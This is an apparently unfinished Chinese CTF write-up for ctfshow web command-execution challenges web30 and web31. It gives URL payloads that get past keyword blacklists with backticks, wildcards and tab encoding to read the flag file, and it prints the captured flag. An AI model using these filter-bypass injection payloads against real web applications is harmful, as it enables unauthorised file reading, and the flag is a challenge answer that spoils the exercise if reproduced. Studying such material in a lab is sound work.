# ctfshow-web-wp

## web入门

### 命令执行

>web30

过滤system,cat(不知道为啥),flag,php
``````
?c=`echo tac fla?.?hp`

?c=`echo nl fla?.?hp`
``````

?可以随意放，只要能绕过过滤

>web31

过滤这些：/flag|system|php|cat|sort|shell|\.| |\'/i  
flag,system,cat,sort,shell,.,'

执行命令可以用`,passthru  
输出文件可以用tac,nl
空格好像不能用%20绕过，要用%09之类的
其他字符用*和?绕过


?c=echo`tac%09fla???hp`;

flag:ctfshow{7557e913-fc46-4835-85a0-008dd4ac63e2}

>web32



>web33

>web

>web

>web

>web

>web

>web

>web

>web

>web

>web

>web